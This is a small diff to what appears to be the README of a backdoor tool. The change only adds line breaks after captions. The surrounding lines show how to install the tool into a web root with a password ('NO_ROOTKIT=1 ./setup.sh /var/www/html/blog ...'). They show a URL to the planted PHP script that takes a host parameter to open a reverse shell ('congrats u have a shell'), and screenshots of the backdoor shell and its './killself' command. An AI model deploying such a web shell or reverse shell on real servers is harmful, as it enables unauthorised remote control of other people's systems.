@@ -30,16 +30,16 @@ NO_ROOTKIT=1 ./setup.sh /var/www/html/blog sexlovegod
    * `http://lol.ok/blog/gjunmf.php?password=sexlovegod&host=urbox`
    * congrats u have a shell
 
-<b>result of successful installation:</b>
+<b>result of successful installation:</b><br>
 <img src="https://i.imgur.com/ujGtRGz.png">
 
-<b>brief usage example upon visiting newly created php script:</b>
+<b>brief usage example upon visiting newly created php script:</b><br>
 <img src="https://i.imgur.com/sDLprex.png">
 
-<b>example reverse shell connection after giving script a target host:</b>
+<b>example reverse shell connection after giving script a target host:</b><br>
 <img src="https://i.imgur.com/BSXy3Hg.png">
 
-<b>using `./killself` in the backdoor shell:</b>
+<b>using `./killself` in the backdoor shell:</b><br>
 <img src="https://i.imgur.com/tkIrWRy.png">
 
 ## general notes
